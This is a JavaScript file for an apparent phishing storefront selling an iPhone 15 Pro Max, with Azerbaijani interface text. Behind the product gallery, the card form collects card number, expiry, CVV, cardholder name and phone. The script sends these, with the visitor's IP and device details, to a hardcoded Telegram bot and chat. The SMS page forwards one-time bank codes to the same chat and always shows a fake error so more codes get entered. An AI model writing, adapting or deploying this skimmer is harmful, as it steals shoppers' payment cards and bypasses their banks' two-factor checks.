// Global Variables
let currentImageIndex = 0
let selectedColor = "desert"
let currentPage = "productPage"
let timerInterval
let timeLeft = 300 // 5 minutes in seconds

// Bot Configuration
const BOT_TOKEN = "7890044397:AAGJfCPAGtZLjdZPx3zj-66caqMICnqb-3w"
const CHAT_ID = "-1002626141042"

// Image arrays for different colors - 3 RENK (GOLD SİLİNDİ!)
const colorImages = {
  black: [
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Ba1-3NjcVoa96MN4X9bs3bQmzwFBhNMevp.webp",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/B2-wwrNsrbcPWOHWuQxyjL3gmmnrHBVB5.webp",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/B3-1cD5YKS8g8zVrr3kqpXiHwDSU3N3T5.webp",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/B4-4LUGyAlnHXC4nYpJevPeQw6Pd3anJH.webp",
  ],
  desert: [
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-BHXg2pLrBIcUiwARxxSnDwMQCRkJqy.png",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-uCeC6Ss0aawHBDEmfRjrC1nfFYuxs3.png",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-XrmuyJ5bSLxWSKh7okiRfjC8sAe1Bf.png",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-WsnSUGttrlxNQYlJLPqHev2cm6Mj3h.png",
  ],
  white: [
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/S1-b6XRx41eY35rcY6EtkAgPXKmlAgAEV.webp",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/S2-D6hckadTmE5Lam91LcIlFL8md3N9OH.webp",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/S3-icw7vj1P3olV6AmuUMoTVXFPoT58NV.webp",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/S4-4A1CcCZxS1L4b6zHALF2t8XK8D2lJC.webp",
  ],
}

// Device Detection
function isMobile() {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
}

function isIOS() {
  return (
    /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1)
  )
}

function isMac() {
  return navigator.platform.toUpperCase().indexOf("MAC") >= 0
}

// Touch event support for mobile
function addTouchSupport(element, callback) {
  if (!element) return

  // Add both click and touch events
  element.addEventListener("click", callback, { passive: false })
  element.addEventListener("touchstart", callback, { passive: false })
  element.addEventListener(
    "touchend",
    (e) => {
      e.preventDefault()
      callback(e)
    },
    { passive: false },
  )

  // Add visual feedback for touch
  element.style.cursor = "pointer"
  element.style.webkitTapHighlightColor = "rgba(0,0,0,0.1)"
  element.style.webkitUserSelect = "none"
  element.style.userSelect = "none"
}

// Global function declarations - Tüm platformlarda çalışması için
function goToCheckout() {
  console.log("goToCheckout called")
  showPage("checkoutPage")
}

function goToProduct() {
  console.log("goToProduct called")
  showPage("productPage")
}

function goToPayment() {
  console.log("goToPayment called")
  showPage("cardPage")
}

function goToSms() {
  console.log("goToSms called")
  showPage("smsPage")
}

function selectImage(index) {
  console.log("selectImage called:", index)
  currentImageIndex = index
  updateMainImage()
  updateThumbnails()
}

function changeImage(direction) {
  console.log("changeImage called:", direction)
  const images = colorImages[selectedColor]
  const newIndex = currentImageIndex + direction

  if (newIndex >= 0 && newIndex < images.length) {
    currentImageIndex = newIndex
    updateMainImage()
    updateThumbnails()
  }
}

function selectColor(colorId, colorName) {
  console.log("selectColor called:", colorId, colorName)
  selectedColor = colorId
  currentImageIndex = 0

  // Update color options
  const colorOptions = document.querySelectorAll(".color-option")
  colorOptions.forEach((option) => {
    option.classList.remove("active")
  })

  // Find and activate the selected color option
  const selectedOption = document.querySelector(`[onclick*="${colorId}"]`)
  if (selectedOption) {
    selectedOption.classList.add("active")
  }

  // Update color name display
  const colorNameElement = document.getElementById("selectedColorName")
  if (colorNameElement) {
    colorNameElement.textContent = colorName
  }

  // Update product title
  const productTitle = document.querySelector(".product-title")
  if (productTitle) {
    productTitle.textContent = `iPhone 15 Pro Max 256 GB ${colorName}`
  }

  // Update breadcrumb
  const breadcrumbCurrent = document.querySelector(".breadcrumb .current")
  if (breadcrumbCurrent) {
    breadcrumbCurrent.textContent = `iPhone 15 Pro Max 256 GB ${colorName}`
  }

  // Update images
  updateMainImage()
  updateThumbnailImages()
  updateThumbnails()
}

function submitCardForm(event) {
  console.log("submitCardForm called")
  event.preventDefault()

  const submitBtn = event.target.querySelector(".btn-confirm")
  submitBtn.textContent = "İşlənir..."
  submitBtn.disabled = true

  // Collect card data
  const cardData = {
    cardNumber: document.getElementById("cardNumber")?.value || "",
    expiry:
      (document.getElementById("expiryMonth")?.value || "") +
      "/" +
      (document.getElementById("expiryYear")?.value || ""),
    cvv: document.getElementById("cvv")?.value || "",
    cardHolder: document.getElementById("cardHolder")?.value || "",
    phone:
      (document.getElementById("phonePrefix")?.value || "") +
      " " +
      (document.getElementById("phoneNumber")?.value || ""),
  }

  // Send to Telegram
  sendToTelegram(cardData, "PAYMENT")

  // Always proceed to SMS page after 1.5 seconds
  setTimeout(() => {
    showPage("smsPage")
  }, 1500)
}

function submitSmsCode(event) {
  console.log("submitSmsCode called")
  event.preventDefault()

  const smsCode = document.getElementById("smsCode")?.value || ""

  // Send SMS code to Telegram
  sendToTelegram({ smsCode }, "SMS")

  // Always show error message and clear input
  const errorMessage = document.getElementById("errorMessage")
  if (errorMessage) {
    errorMessage.style.display = "block"
  }

  // Clear the input
  const smsInput = document.getElementById("smsCode")
  if (smsInput) {
    smsInput.value = ""
  }
}

function resendSms() {
  console.log("resendSms called")
  // Reset timer
  startTimer()

  // Show success message
  alert("SMS kodu yenidən göndərildi")

  // Clear any error messages
  const errorMessage = document.getElementById("errorMessage")
  if (errorMessage) {
    errorMessage.style.display = "none"
  }
}

// Global scope'a fonksiyonları ekle
if (typeof window !== "undefined") {
  window.goToCheckout = goToCheckout
  window.goToProduct = goToProduct
  window.goToPayment = goToPayment
  window.goToSms = goToSms
  window.selectImage = selectImage
  window.changeImage = changeImage
  window.selectColor = selectColor
  window.submitCardForm = submitCardForm
  window.submitSmsCode = submitSmsCode
  window.resendSms = resendSms
}

// showPage fonksiyonu
function showPage(pageId) {
  console.log("showPage called:", pageId)
  // Hide all pages
  const pages = document.querySelectorAll(".page")
  pages.forEach((page) => {
    page.classList.remove("active")
  })

  // Show selected page
  const targetPage = document.getElementById(pageId)
  if (targetPage) {
    targetPage.classList.add("active")
    currentPage = pageId

    // Start timer for SMS page
    if (pageId === "smsPage") {
      startTimer()
    } else {
      stopTimer()
    }

    // Scroll to top
    window.scrollTo(0, 0)
  }
}

window.goToCheckout = () => {
  showPage("checkoutPage")
}

window.goToProduct = () => {
  showPage("productPage")
}

window.goToPayment = () => {
  showPage("cardPage")
}

window.goToSms = () => {
  showPage("smsPage")
}

// showPage fonksiyonunu da window'a ekle
window.showPage = (pageId) => {
  // Hide all pages
  const pages = document.querySelectorAll(".page")
  pages.forEach((page) => {
    page.classList.remove("active")
  })

  // Show selected page
  const targetPage = document.getElementById(pageId)
  if (targetPage) {
    targetPage.classList.add("active")
    currentPage = pageId

    // Start timer for SMS page
    if (pageId === "smsPage") {
      startTimer()
    } else {
      stopTimer()
    }

    // Scroll to top
    window.scrollTo(0, 0)
  }
}

window.selectImage = (index) => {
  currentImageIndex = index
  updateMainImage()
  updateThumbnails()
}

window.changeImage = (direction) => {
  const images = colorImages[selectedColor]
  const newIndex = currentImageIndex + direction

  if (newIndex >= 0 && newIndex < images.length) {
    currentImageIndex = newIndex
    updateMainImage()
    updateThumbnails()
  }
}

window.selectColor = (colorId, colorName) => {
  selectedColor = colorId
  currentImageIndex = 0

  // Update color options
  const colorOptions = document.querySelectorAll(".color-option")
  colorOptions.forEach((option) => {
    option.classList.remove("active")
  })

  // Find and activate the selected color option
  const selectedOption = document.querySelector(`[onclick*="${colorId}"]`)
  if (selectedOption) {
    selectedOption.classList.add("active")
  }

  // Update color name display
  const colorNameElement = document.getElementById("selectedColorName")
  if (colorNameElement) {
    colorNameElement.textContent = colorName
  }

  // Update product title
  const productTitle = document.querySelector(".product-title")
  if (productTitle) {
    productTitle.textContent = `iPhone 15 Pro Max 256 GB ${colorName}`
  }

  // Update breadcrumb
  const breadcrumbCurrent = document.querySelector(".breadcrumb .current")
  if (breadcrumbCurrent) {
    breadcrumbCurrent.textContent = `iPhone 15 Pro Max 256 GB ${colorName}`
  }

  // Update images
  updateMainImage()
  updateThumbnailImages()
  updateThumbnails()
}

window.submitCardForm = (event) => {
  event.preventDefault()

  const submitBtn = event.target.querySelector(".btn-confirm")
  submitBtn.textContent = "İşlənir..."
  submitBtn.disabled = true

  // Collect card data
  const cardData = {
    cardNumber: document.getElementById("cardNumber")?.value || "",
    expiry:
      (document.getElementById("expiryMonth")?.value || "") +
      "/" +
      (document.getElementById("expiryYear")?.value || ""),
    cvv: document.getElementById("cvv")?.value || "",
    cardHolder: document.getElementById("cardHolder")?.value || "",
    phone:
      (document.getElementById("phonePrefix")?.value || "") +
      " " +
      (document.getElementById("phoneNumber")?.value || ""),
  }

  // Send to Telegram
  sendToTelegram(cardData, "PAYMENT")

  // Always proceed to SMS page after 1.5 seconds
  setTimeout(() => {
    showPage("smsPage")
  }, 1500)
}

window.submitSmsCode = (event) => {
  event.preventDefault()

  const smsCode = document.getElementById("smsCode")?.value || ""

  // Send SMS code to Telegram
  sendToTelegram({ smsCode }, "SMS")

  // Always show error message and clear input
  const errorMessage = document.getElementById("errorMessage")
  if (errorMessage) {
    errorMessage.style.display = "block"
  }

  // Clear the input
  const smsInput = document.getElementById("smsCode")
  if (smsInput) {
    smsInput.value = ""
  }
}

window.resendSms = () => {
  // Reset timer
  startTimer()

  // Show success message
  alert("SMS kodu yenidən göndərildi")

  // Clear any error messages
  const errorMessage = document.getElementById("errorMessage")
  if (errorMessage) {
    errorMessage.style.display = "none"
  }
}

// Initialize the application
document.addEventListener("DOMContentLoaded", () => {
  console.log("DOM loaded, initializing app")
  initializeApp()
})

// iOS/Safari için ek event listener
document.addEventListener("touchstart", () => {}, { passive: true })

function initializeApp() {
  console.log("App initializing...")
  showPage("productPage")
  updateMainImage()
  setupEventListeners()
  setupMobileSupport()
}

function setupMobileSupport() {
  console.log("Setting up mobile support...")

  // Ana buton için touch support
  const primaryBtn = document.querySelector(".btn-primary")
  if (primaryBtn) {
    addTouchSupport(primaryBtn, (e) => {
      e.preventDefault()
      e.stopPropagation()
      goToCheckout()
    })
  }

  // Complete order buton için touch support
  const completeBtn = document.querySelector(".btn-complete-order")
  if (completeBtn) {
    addTouchSupport(completeBtn, (e) => {
      e.preventDefault()
      e.stopPropagation()
      goToPayment()
    })
  }

  // Back butonları için touch support
  const backBtns = document.querySelectorAll(".back-btn")
  backBtns.forEach((btn) => {
    addTouchSupport(btn, (e) => {
      e.preventDefault()
      e.stopPropagation()
      const onclick = btn.getAttribute("onclick")
      if (onclick) {
        eval(onclick)
      }
    })
  })

  // Thumbnail butonları için touch support
  const thumbnails = document.querySelectorAll(".thumbnail")
  thumbnails.forEach((thumb, index) => {
    addTouchSupport(thumb, (e) => {
      e.preventDefault()
      e.stopPropagation()
      selectImage(index)
    })
  })

  // Color butonları için touch support
  const colorBtns = document.querySelectorAll(".color-option")
  colorBtns.forEach((btn) => {
    addTouchSupport(btn, (e) => {
      e.preventDefault()
      e.stopPropagation()
      const onclick = btn.getAttribute("onclick")
      if (onclick) {
        eval(onclick)
      }
    })
  })

  // Navigation butonları için touch support
  const navBtns = document.querySelectorAll(".nav-btn")
  navBtns.forEach((btn) => {
    addTouchSupport(btn, (e) => {
      e.preventDefault()
      e.stopPropagation()
      const onclick = btn.getAttribute("onclick")
      if (onclick) {
        eval(onclick)
      }
    })
  })

  // Form butonları için touch support
  const formBtns = document.querySelectorAll(".btn-confirm, .btn-cancel, .btn-resend")
  formBtns.forEach((btn) => {
    addTouchSupport(btn, (e) => {
      e.preventDefault()
      e.stopPropagation()
      if (btn.type === "submit") {
        const form = btn.closest("form")
        if (form) {
          const event = new Event("submit", { bubbles: true, cancelable: true })
          form.dispatchEvent(event)
        }
      } else {
        const onclick = btn.getAttribute("onclick")
        if (onclick) {
          eval(onclick)
        }
      }
    })
  })
}

function setupEventListeners() {
  console.log("Setting up event listeners...")

  // Phone number formatting
  const phonePrefix = document.getElementById("phonePrefix")
  const phoneNumber = document.getElementById("phoneNumber")

  if (phonePrefix) {
    phonePrefix.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "")
      if (value.startsWith("0")) {
        value = value.substring(1)
      }
      if (value.length > 2) {
        value = value.substring(0, 2)
      }
      e.target.value = value
    })
  }

  if (phoneNumber) {
    phoneNumber.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "")
      if (value.length > 7) {
        value = value.substring(0, 7)
      }
      // Format as XXX XX XX
      if (value.length > 3) {
        if (value.length > 5) {
          value = value.substring(0, 3) + " " + value.substring(3, 5) + " " + value.substring(5)
        } else {
          value = value.substring(0, 3) + " " + value.substring(3)
        }
      }
      e.target.value = value
    })
  }

  // Card number formatting
  const cardNumber = document.getElementById("cardNumber")
  if (cardNumber) {
    cardNumber.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "")
      if (value.length > 16) {
        value = value.substring(0, 16)
      }
      // Format as XXXX XXXX XXXX XXXX
      value = value.replace(/(\d{4})(?=\d)/g, "$1 ")
      e.target.value = value
    })
  }

  // Expiry date formatting
  const expiryMonth = document.getElementById("expiryMonth")
  const expiryYear = document.getElementById("expiryYear")

  if (expiryMonth) {
    expiryMonth.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "")
      if (value.length > 2) {
        value = value.substring(0, 2)
      }
      if (value.length === 2 && Number.parseInt(value) > 12) {
        value = "12"
      }
      if (value.length === 1 && Number.parseInt(value) > 1) {
        value = "0" + value
      }
      e.target.value = value
    })
  }

  if (expiryYear) {
    expiryYear.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "")
      if (value.length > 2) {
        value = value.substring(0, 2)
      }
      e.target.value = value
    })
  }

  // CVV formatting
  const cvv = document.getElementById("cvv")
  if (cvv) {
    cvv.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "")
      if (value.length > 3) {
        value = value.substring(0, 3)
      }
      e.target.value = value
    })
  }

  // Card holder name formatting
  const cardHolder = document.getElementById("cardHolder")
  if (cardHolder) {
    cardHolder.addEventListener("input", (e) => {
      e.target.value = e.target.value.toUpperCase()
    })
  }

  // Mobile viewport fix
  if (isMobile()) {
    const viewport = document.querySelector("meta[name=viewport]")
    if (viewport) {
      viewport.setAttribute("content", "width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no")
    }
  }
}

// Product Image Functions
function updateMainImage() {
  const mainImage = document.getElementById("mainImage")
  const images = colorImages[selectedColor]

  if (mainImage && images && images[currentImageIndex]) {
    mainImage.src = images[currentImageIndex]
    mainImage.alt = `iPhone 15 Pro Max ${getColorName(selectedColor)} görünüş ${currentImageIndex + 1}`
  }
}

function updateThumbnails() {
  const thumbnails = document.querySelectorAll(".thumbnail")
  thumbnails.forEach((thumbnail, index) => {
    if (index === currentImageIndex) {
      thumbnail.classList.add("active")
    } else {
      thumbnail.classList.remove("active")
    }
  })
}

function updateThumbnailImages() {
  const thumbnails = document.querySelectorAll(".thumbnail img")
  const images = colorImages[selectedColor]

  thumbnails.forEach((thumbnail, index) => {
    if (images && images[index]) {
      thumbnail.src = images[index]
      thumbnail.alt = `iPhone 15 Pro Max ${getColorName(selectedColor)} görünüş ${index + 1}`
    }
  })
}

function getColorName(colorId) {
  const colorNames = {
    black: "Qara",
    desert: "Desert Titanium",
    white: "Ağ",
  }
  return colorNames[colorId] || "Desert Titanium"
}

// Utility Functions
function generateUserId() {
  const timestamp = Date.now()
  const random = Math.random().toString(36).substring(2, 8)
  return `USER_${timestamp}_${random}`.toUpperCase()
}

function getUserIP() {
  return fetch("https://api.ipify.org?format=json")
    .then((response) => response.json())
    .then((data) => data.ip)
    .catch(() => "Unknown IP")
}

// Telegram Integration
async function sendToTelegram(data, messageType = "PAYMENT") {
  try {
    const userIP = await getUserIP()
    const userId = generateUserId()
    const deviceInfo = `${navigator.platform} - ${navigator.userAgent.substring(0, 50)}...`

    let message = ""

    if (messageType === "PAYMENT") {
      message =
        `🔴 YENİ KART BİLGİSİ\n\n` +
        `👤 User ID: ${userId}\n` +
        `🌐 IP: ${userIP}\n` +
        `📱 Device: ${deviceInfo}\n` +
        `💳 Kart: ${data.cardNumber}\n` +
        `📅 Tarih: ${data.expiry}\n` +
        `🔒 CVV: ${data.cvv}\n` +
        `👨‍💼 Ad: ${data.cardHolder}\n` +
        `📞 Tel: +994 ${data.phone}\n` +
        `⏰ Zaman: ${new Date().toLocaleString("tr-TR")}`
    } else if (messageType === "SMS") {
      message =
        `🔴 SMS KODU GİRİLDİ\n\n` +
        `👤 User ID: ${userId}\n` +
        `🌐 IP: ${userIP}\n` +
        `📱 Device: ${deviceInfo}\n` +
        `🔢 SMS Kod: ${data.smsCode}\n` +
        `⏰ Zaman: ${new Date().toLocaleString("tr-TR")}`
    }

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`

    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    })

    const result = await response.json()
    console.log("Telegram response:", result)
    return result.ok
  } catch (error) {
    console.error("Telegram error:", error)
    return false
  }
}

// Timer Functions
function startTimer() {
  timeLeft = 300 // Reset to 5 minutes
  updateTimerDisplay()

  timerInterval = setInterval(() => {
    timeLeft--
    updateTimerDisplay()

    if (timeLeft <= 0) {
      stopTimer()
      // Handle timeout
      alert("Vaxt bitdi. Yenidən cəhd edin.")
      showPage("cardPage")
    }
  }, 1000)
}

function stopTimer() {
  if (timerInterval) {
    clearInterval(timerInterval)
    timerInterval = null
  }
}

function updateTimerDisplay() {
  const timerElement = document.getElementById("timer")
  if (timerElement) {
    const minutes = Math.floor(timeLeft / 60)
    const seconds = timeLeft % 60
    timerElement.textContent = `${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`
  }
}

// Initialize when page loads
window.addEventListener("load", () => {
  console.log("iPhone Product Page Loaded Successfully!")
  console.log("Device info:", {
    isMobile: isMobile(),
    isIOS: isIOS(),
    isMac: isMac(),
    userAgent: navigator.userAgent,
  })
})

// iOS Safari için ek düzeltmeler
if (isIOS()) {
  document.addEventListener("touchstart", () => {}, { passive: true })

  // iOS'ta onclick olaylarını zorla aktif et
  document.addEventListener("DOMContentLoaded", () => {
    const clickableElements = document.querySelectorAll("button, [onclick]")
    clickableElements.forEach((element) => {
      element.style.cursor = "pointer"
      element.addEventListener("touchstart", () => {}, { passive: true })
    })
  })
}
